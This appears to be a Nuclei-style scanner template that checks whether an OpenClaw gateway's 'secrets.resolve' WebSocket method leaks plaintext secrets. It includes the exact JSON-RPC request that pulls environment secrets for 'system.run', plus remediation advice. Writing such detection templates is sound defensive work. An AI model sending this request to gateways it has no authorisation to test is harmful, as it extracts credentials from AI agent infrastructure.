id: openclaw-secrets-resolve
info:
  author: lobster-guard
  classification:
    cwe-id: CWE-200
  description: "Tests if secrets.resolve WS method returns plaintext secret values\
    \ \u2014 the internal API used to inject secrets into tool environments"
  metadata:
    max-request: 1
    product: openclaw
    vendor: openclaw
    verified: false
  name: OpenClaw secrets.resolve Plaintext Extraction
  remediation: Restrict secrets.resolve WS method to internal agent runtime only.
    Never expose on external-facing Gateway.
  severity: critical
  tags: openclaw,secrets,extraction,critical
websocket:
- address: '{{Host}}/gateway'
  inputs:
  - data: '{"jsonrpc":"2.0","id":1,"method":"secrets.resolve","params":{"commandName":"system.run","targetIds":["env"]}}'
  matchers:
  - condition: and
    type: word
    words:
    - assignments
    - value
    - path
  matchers-condition: and
